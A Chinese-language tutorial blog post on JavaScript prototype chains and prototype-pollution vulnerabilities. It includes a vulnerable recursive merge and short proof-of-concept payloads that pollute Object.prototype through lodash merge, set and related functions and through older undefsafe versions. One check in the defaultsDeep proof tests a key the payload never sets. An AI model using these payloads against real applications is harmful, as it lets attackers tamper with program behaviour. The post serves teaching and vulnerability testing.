---
layout: post
title: "js原型链污染"
date: 2025-03-14 07:47:44 +0800
description: "并且很少有真正的私有属性，类的所有属性都运行被公开的访问和修改，包括proto，构造函数和原型。merge函数通常用于将多个对象合并成一个，但主要是将一个对象的属性复制到另一个对象中，生成一个新的合并结果。是一个对象,包含构造函数的所有实例共享的属性和方法(即让该函数所实例化的对象们都能找到共用的属性和方法)。在js中一切引用类型都是对象。属性所指向的对象，如果这个原型对象(父对象)也不存在，就会继续沿着这个原型对象(父对象)的。每个对象从创建的开始就和另一个对象关联，从另一个对象上继承它的属性，其中的。"
keywords: "js原型链污染"
categories: ['未分类']
tags: ['开发语言', '原型模式', 'Javascript']
artid: "146247830"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146247830
    alt: "js原型链污染"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146247830
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146247830
cover: https://bing.ee123.net/img/rand?artid=146247830
image: https://bing.ee123.net/img/rand?artid=146247830
img: https://bing.ee123.net/img/rand?artid=146247830
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     js原型链污染
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
    </p>
    <p>
    </p>
    <h3>
     <a id="_3">
     </a>
     前置知识
    </h3>
    <h4>
     <a id="_5">
     </a>
     对象
    </h4>
    <p>
     对象可以看作是一个包含数据(变量)和方法(函数)的属性集合。在js中一切引用类型都是对象。
    </p>
    <p>
     <code>
      引用类型：Array(数组)类型、Function(函数)类型、Object类型(引用类型的核心)、Data(日期)类型、RegExp(正则)类型
     </code>
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> <span class="token function-variable function">hello</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//这目前只是一个普通的函数</span>
<span class="token keyword">var</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//当通过new关键字调用了hello函数时，hello就是一个构造函数</span>
</code></pre>
    <blockquote>
     <p>
      当使用new关键字调用函数时：首先js会隐式创建一个新的空对象，并将其作为
      <code>
       this
      </code>
      绑定到构造函数中。这个新对象的原型会被设置为构造函数的
      <code>
       prototype
      </code>
      对象(后面会说)，接着函数体内部的代码会在新创建的对象上执行。
     </p>
    </blockquote>
    <h4>
     <a id="__proto__prototypeconstructor_24">
     </a>
     <strong>
      三个重要属性：
      <code>
       __proto__
      </code>
      、
      <code>
       prototype
      </code>
      、
      <code>
       constructor
      </code>
     </strong>
    </h4>
    <blockquote>
     <p>
      <code>
       __proto__
      </code>
      属性和
      <code>
       constructor
      </code>
      属性是对象特有的。
      <code>
       __proto__
      </code>
      通常称为隐式原型，
      <code>
       prototype
      </code>
      通常称为显式原型
      <br/>
      <code>
       prototype
      </code>
      属性是函数独有的
     </p>
    </blockquote>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/f150f31ef0b540109b7aa51cf45cb61a.png"/>
    </p>
    <p>
     以上面的代码为例
    </p>
    <p>
     <strong>
      <code>
       prototype属性
      </code>
     </strong>
    </p>
    <p>
     <code>
      prototype
     </code>
     属性是函数独有的，从
     <code>
      一个函数指向一个对象
     </code>
     ，含义是
     <code>
      函数的原型对象
     </code>
     。
    </p>
    <p>
     因此
     <code>
      prototype
     </code>
     是一个对象,包含构造函数的所有实例共享的属性和方法(即让该函数所实例化的对象们都能找到共用的属性和方法)。
    </p>
    <p>
     在函数创建时，会默认同时创建这个函数的prototype对象。
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/5b5c397c1a1145b0912111e4a8ec7f3a.png"/>
    </p>
    <p>
     <strong>
      <code>
       __proto__属性
      </code>
     </strong>
    </p>
    <p>
     <code>
      __proto__
     </code>
     属性是对象独有的，这个属性都是从
     <code>
      一个对象指向一个对象
     </code>
     ，即指向他们各自的
     <code>
      原型对象
     </code>
     (父对象)。
    </p>
    <p>
     因此
     <code>
      __proto__
     </code>
     的作用是告诉我们一个对象的
     <code>
      原型对象
     </code>
     是谁。
     <br/>
     当访问一个对象的属性时，如果该对象内部不存在这个属性，就会去找它的
     <code>
      __proto__
     </code>
     属性所指向的对象，如果这个原型对象(父对象)也不存在，就会继续沿着这个原型对象(父对象)的
     <code>
      __proto__
     </code>
     属性找它的原型对象(爷爷对象)。如果还没找到，就继续找，直到原型链的顶端
     <code>
      null
     </code>
     。
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/7380088a520a4223b9088481e4579c02.png"/>
    </p>
    <p>
     <strong>
      <code>
       constructor
      </code>
     </strong>
    </p>
    <p>
     <code>
      constructor
     </code>
     属性也是对象独有的，这个属性从
     <code>
      一个对象指向一个函数
     </code>
     ，即
     <code>
      指向该对象的构造函数
     </code>
     。所有函数的最终构造函数都指向了
     <code>
      function
     </code>
    </p>
    <p>
     function()有一点特殊，它既可以看成函数也可以看成对象。所有函数和对象都是由function构造函数得到的，因此
     <code>
      constructor
     </code>
     属性的终点就是function()函数。
     <br/>
     <code>
      Function
     </code>
     是原生构造函数，自动出现在运行环境中
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/d1edd5fdd6484e949efe4911d7773bd5.png"/>
    </p>
    <p>
     <strong>
      总结
     </strong>
    </p>
    <pre><code class="prism language-js"><span class="token number">1</span>、__proto__和constructor属性是对象独有的<span class="token punctuation">;</span>而prototype属性是函数独有的。但函数也是一种对象，所有函数也拥有__proto__和constructor属性
<span class="token number">2</span>、__proto__通常被称为隐式原型，prototype通常被称为显式原型。一个对象的隐式原型指向了该对象的构造函数的显示原型。
<span class="token number">3</span>、函数创建的对象<span class="token punctuation">.</span>__proto__<span class="token operator">===</span><span class="token class-name">该函数</span><span class="token punctuation">.</span>prototype
   <span class="token class-name">函数</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token operator">===</span>该函数本身
   因此在这个例子中a<span class="token punctuation">.</span>__proto__<span class="token operator">===</span>hello<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> hello<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token operator">===</span>hello
</code></pre>
    <h4>
     <a id="JS_79">
     </a>
     JS原型与原型链继承
    </h4>
    <p>
     每个对象从创建的开始就和另一个对象关联，从另一个对象上继承它的属性，其中的
     <code>
      另一个对象
     </code>
     就是
     <code>
      原型
     </code>
    </p>
    <p>
     由于对象及其原型组成的链子就是原型链
    </p>
    <p>
     在这里插入图片描述
    </p>
    <h3>
     <a id="_90">
     </a>
     原型链污染
    </h3>
    <p>
     在js中没有类的概念，继承都是通过原型链来实现的。并且很少有真正的私有属性，类的所有属性都运行被公开的访问和修改，包括proto，构造函数和原型。因此攻击者可以通过注入其他值来覆盖或污染proto，构造函数和原型属性，这就是原型链污染。
    </p>
    <h4>
     <a id="Merge_94">
     </a>
     Merge类操作原型链污染
    </h4>
    <p>
     Merge类操作是最常见的肯能控制键名的操作，因此也最可能导致原型链污染。
    </p>
    <p>
     merge函数通常用于将多个对象合并成一个，但主要是将一个对象的属性复制到另一个对象中，生成一个新的合并结果
    </p>
    <p>
     例：经典递归漏洞
    </p>
    <pre><code class="prism language-js">#merge函数功能
<span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">let</span> object1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
<span class="token keyword">let</span> object2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{"a": 1, "__proto__": {"b": 2}}'</span><span class="token punctuation">)</span>
<span class="token function">merge</span><span class="token punctuation">(</span>object1<span class="token punctuation">,</span> object2<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> object1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
<span class="token comment">//输出1   2</span>
object3 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object3<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
<span class="token comment">//输出 2</span>
</code></pre>
    <p>
     可以看到object3的b是从原型获取到的，说明Object已被污染。
    </p>
    <p>
     因为在json解析的时候，
     <code>
      __proto__
     </code>
     会被当成一个键名而不是原型，因此遍历object2时会存在这个键，所有Object被污染了
    </p>
    <p>
     <strong>
      merge()不安全的原因：
     </strong>
    </p>
    <p>
     1、这个函数对
     <code>
      source
     </code>
     对象中的所有属性进行迭代(对象source在键值相同的情况下拥有更高的优先权)
     <br/>
     2、如果属性同时存在与第一个和第二个参数中，且都是Object的话，它就会递归地合并这个属性
     <br/>
     3、如果控制了
     <code>
      source[key]
     </code>
     的值，使其变成
     <code>
      __proto__
     </code>
     ，且能控制
     <code>
      source
     </code>
     中
     <code>
      __proto__
     </code>
     属性的值，在递归的时候，
     <code>
      target[key]
     </code>
     在某个特定的时候，就会指向对象
     <code>
      target
     </code>
     的
     <code>
      prototype
     </code>
     ，我们就能添加一个新的属性到该对象的原型链中了。
    </p>
    <h4>
     <a id="Lodash_137">
     </a>
     Lodash模块原型链污染
    </h4>
    <p>
     lodash是一个包含简化字符串、数字、数组、函数和对象的js库
    </p>
    <h5>
     <a id="lodashdefaultsDeep_141">
     </a>
     lodash.defaultsDeep方法造成原型链污染
    </h5>
    <p>
     lodash库中的
     <code>
      defaultsDeep
     </code>
     函数可能会被包含
     <code>
      constructor
     </code>
     的payload添加或修改
     <code>
      object.prototype
     </code>
    </p>
    <p>
     漏洞验证POC
    </p>
    <pre><code class="prism language-js"><span class="token keyword">const</span> mergeFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>defaultsDeep<span class="token punctuation">;</span>
<span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token string">'{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'</span>

<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">mergeFn</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">a0</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Vulnerable to Prototype Pollution via </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${<!-- --></span>payload<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h5>
     <a id="lodashmerge__160">
     </a>
     lodash.merge 方法造成的原型链污染
    </h5>
    <p>
     lodash.merge作为lodash中的对象合并插件，它可以递归合并
     <code>
      sources
     </code>
     来源对象自身和继承的可枚举属性到
     <code>
      object
     </code>
     目标对象，以此来创建父映射对象
    </p>
    <pre><code class="prism language-js"><span class="token function">merge</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> sources<span class="token punctuation">)</span>
</code></pre>
    <p>
     漏洞验证POC
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> lodash<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">'{"__proto__":{"whoami":"Vulnerable"}}'</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before whoami: "</span> <span class="token operator">+</span> a<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After whoami: "</span> <span class="token operator">+</span> a<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h5>
     <a id="lodashmergeWith__180">
     </a>
     lodash.mergeWith 方法造成的原型链污染
    </h5>
    <p>
     lodash.mergeWith方法类似于merge方法，但它还会接受一个
     <code>
      customizer
     </code>
     ，来决定如何合并，如果
     <code>
      customizer
     </code>
     返回
     <code>
      undefined
     </code>
     将会由合并处理方法代替。
    </p>
    <pre><code class="prism language-js"><span class="token function">mergeWith</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> sources<span class="token punctuation">,</span> <span class="token punctuation">[</span>customizer<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     漏洞验证POC
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> lodash<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">'{"__proto__":{"whoami":"Vulnerable"}}'</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before whoami: "</span> <span class="token operator">+</span> a<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
lodash<span class="token punctuation">.</span><span class="token function">mergeWith</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After whoami: "</span> <span class="token operator">+</span> a<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h5>
     <a id="lodashset__200">
     </a>
     lodash.set 方法造成的原型链污染
    </h5>
    <p>
     lodash.set 方法可以用来设置值到对象对应的属性路径上，如果没有则创建这部分路径。 缺少的索引属性会创建为数组，而缺少的属性会创建为对象
    </p>
    <pre><code class="prism language-js"><span class="token function">set</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
</code></pre>
    <p>
     漏洞验证POC
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> lodash<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> object_1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string-property property">'a'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span> <span class="token string-property property">'b'</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> <span class="token string-property property">'c'</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> object_2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object_1<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//lodash.set(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');</span>
lodash<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>object_2<span class="token punctuation">,</span> <span class="token string">'__proto__.["whoami"]'</span><span class="token punctuation">,</span> <span class="token string">'Vulnerable'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object_1<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h5>
     <a id="lodashsetWith__222">
     </a>
     lodash.setWith 方法造成的原型链污染
    </h5>
    <p>
     lodash.setWith 方法类似
     <code>
      set
     </code>
     方法。但是它还会接受一个
     <code>
      customizer
     </code>
     ，用来调用并决定如何设置对象路径的值。 如果
     <code>
      customizer
     </code>
     返回
     <code>
      undefined
     </code>
     将会有它的处理方法代替。
    </p>
    <pre><code class="prism language-js"><span class="token function">setWith</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token punctuation">[</span>customizer<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     漏洞验证POC
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> lodash<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> object_1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string-property property">'a'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span> <span class="token string-property property">'b'</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> <span class="token string-property property">'c'</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> object_2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object_1<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');</span>
lodash<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span>object_2<span class="token punctuation">,</span> <span class="token string">'__proto__.["whoami"]'</span><span class="token punctuation">,</span> <span class="token string">'Vulnerable'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object_1<span class="token punctuation">.</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h4>
     <a id="Undefsafe_246">
     </a>
     Undefsafe模块原型链污染
    </h4>
    <p>
     Undefsafe 是 Nodejs 的一个第三方模块，其核心是一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3版本）中存在原型链污染漏洞（CVE-2019-10795），攻击者可利用该漏洞添加或修改 Object.prototype 属性。
    </p>
    <p>
     例子：
    </p>
    <pre><code class="prism language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"undefsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this is '</span><span class="token operator">+</span>test<span class="token punctuation">)</span>    <span class="token comment">// 将test对象与字符串'this is '进行拼接</span>
<span class="token comment">// this is [object Object]</span>
</code></pre>
    <p>
     返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：
    </p>
    <pre><code class="prism language-js"><span class="token function">a</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span><span class="token string">'__proto__.toString'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> <span class="token keyword">return</span> <span class="token string">'just a evil!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this is '</span><span class="token operator">+</span>test<span class="token punctuation">)</span>    <span class="token comment">// 将test对象与字符串'this is '进行拼接</span>
<span class="token comment">// this is just a evil!</span>
</code></pre>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323330315f37393436393334312f:61727469636c652f64657461696c732f313436323437383330" class_="artid" style="display:none">
 </p>
</div>


